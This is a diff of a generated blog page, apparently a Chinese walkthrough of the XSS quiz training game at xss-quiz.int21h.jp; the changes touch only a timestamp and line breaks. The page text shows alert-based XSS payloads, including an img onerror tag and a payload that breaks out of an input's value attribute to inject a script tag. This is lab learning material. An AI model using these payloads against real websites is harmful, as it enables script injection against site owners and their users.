@@ -102,7 +102,7 @@ or
 &amp;lt;img onerror=&amp;quot;alert(document.domain);&amp;quot; src= /&amp;gt; 
 or
 &amp;lt;script&amp;gt;alert">
-<meta property="og:updated_time" content="2016-09-08T07:32:21.999Z">
+<meta property="og:updated_time" content="2016-09-08T07:40:21.671Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS过关小游戏~">
 <meta name="twitter:description" content="这个挺有意思的，好像日本的一个学生写的，入门XSS，感觉学到了不少！
@@ -312,7 +312,7 @@ or
 <pre><code>&lt;img onerror=&quot;alert(document.domain);&quot; src= /&gt; 
 </code></pre><p>or</p>
 <pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
-</code></pre><h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><font color="red"><a href="http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7</a></font><br><br><br>先用<br><br>    <script>alert(document.domain);</script><br>检查源码，发现，组成<br><br>    <input size="50" value="<script>alert(document.domain);</script>" name="p1"><br>没有过滤，可以组合js，闭合<code>value=&quot;&quot;</code>，进行注入！<br><br>    “&gt;<script>alert(document.domain);</script>&lt;<br><br># 第三关<br><font color="red"><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82</a></font>
+</code></pre><h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><font color="red"><a href="http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7</a></font><br><br><br>先用<br><br>    <script>alert(document.domain);</script><br><br>检查源码，发现，组成<br><br>    <input size="50" value="<script>alert(document.domain);</script>" name="p1"><br><br>没有过滤，可以组合js，闭合<code>value=&quot;&quot;</code>，进行注入！<br><br>    “&gt;<script>alert(document.domain);</script>&lt;<br><br># 第三关<br><font color="red"><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82</a></font>
 
 <p>输入：</p>
 <pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
